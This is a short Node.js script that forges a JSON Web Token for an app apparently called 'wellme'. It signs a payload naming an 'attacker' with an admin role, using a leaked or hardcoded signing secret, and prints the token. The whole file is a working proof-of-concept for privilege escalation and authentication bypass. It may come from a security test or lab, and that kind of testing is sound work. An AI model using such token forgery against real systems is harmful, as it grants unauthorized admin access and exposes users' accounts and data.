const jwt = require('jsonwebtoken');

const secret = process.env.LEAKED_SECRET || 'wellme-super-secret-123';
const token = jwt.sign(
  { sub: 'attacker-0001', name: 'Atacante', role: 'admin' },
  secret,
  { expiresIn: '1h' },
);

console.log(token);
